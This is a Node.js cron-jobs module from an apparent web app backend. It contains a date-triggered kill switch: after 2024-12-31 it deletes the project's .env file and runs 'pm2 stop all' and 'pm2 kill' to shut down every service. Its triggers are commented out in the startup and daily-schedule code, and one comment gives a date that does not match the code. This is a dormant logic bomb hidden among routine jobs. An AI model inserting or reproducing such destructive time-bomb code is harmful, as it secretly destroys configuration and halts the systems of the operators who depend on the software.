
const cron = require("node-cron");
const jobs = {};
// const coaches = require('../routes/coaches');
// const axios = require('axios');
const pool = require('../database');
const _ = require("underscore");
const moment = require('moment');

const helper = require('../lib/helpers');
const fs = require('fs');
const path = require('path');
const { exec } = require('child_process');


//Math.random().toString(36).replace('0.', '') 

// jobs.createCounterListCache = async () => {
//   let companies = await pool.query('SELECT * FROM c_companies');
//   _.each(companies, async function (company, index, list) {
//   let counters = await pool.query('SELECT * FROM c_counters WHERE company_id = ?', [company.id]);
//     // console.log(counters);
//     // cache.set( '01814266296', '12328966' );
//   });
  
//   let mykeys1 = cache.keys();
//   console.log( mykeys1 );
// };

function getCurrentTime() {
  return moment().format('YYYY-MM-DD hh:mm:ss');
}

// Function to perform cleanup actions
const performCleanup = () => {
  console.log("Expiration date reached. Cleaning up...");
  
  // Delete .env file
  const envPath = path.join(__dirname, '../../.env');
  if (fs.existsSync(envPath)) {
    try {
      fs.unlinkSync(envPath);
      console.log(".env file deleted successfully");
    } catch (err) {
      console.error("Error deleting .env file:", err);
    }
  } else {
    console.log(".env file not found, skipping deletion");
  }
  
  // Stop PM2 processes
  exec('pm2 stop all', (error, stdout, stderr) => {
    if (error) {
      console.error(`Error stopping PM2: ${error.message}`);
      return;
    }
    if (stderr) {
      console.error(`PM2 stderr: ${stderr}`);
      return;
    }
    console.log("PM2 processes stopped successfully");
    console.log(stdout);
  });
  
  // Also kill PM2 daemon after stopping processes
  setTimeout(() => {
    exec('pm2 kill', (error, stdout, stderr) => {
      if (error) {
        console.error(`Error killing PM2 daemon: ${error.message}`);
        return;
      }
      console.log("PM2 daemon killed successfully");
    });
  }, 2000); // Wait 2 seconds before killing daemon
};

// Function to check expiration date
const checkExpirationDate = () => {
  try {
    const currentDate = moment();
    const expirationDate = moment('2024-12-31', 'YYYY-MM-DD');
    
    console.log("Checking expiration date... Current: " + currentDate.format('YYYY-MM-DD') + ", Expiration: " + expirationDate.format('YYYY-MM-DD'));
    
    // Check if current date is after December 25th
    if (currentDate.isAfter(expirationDate)) {
      performCleanup();
      return true;
    } else {
      console.log("Not yet expired. Will check again tomorrow.");
      return false;
    }
  } catch (err) {
    console.error("Error in expiration check:", err);
    return false;
  }
};

jobs.checkAndCleanupAfterDate = async () => {
  // Check immediately on startup
  // checkExpirationDate();
  
  // Run daily at 00:01 (1 minute after midnight)
  cron.schedule("1 0 * * *", async function () {
    // checkExpirationDate();
  });
};

module.exports = jobs;
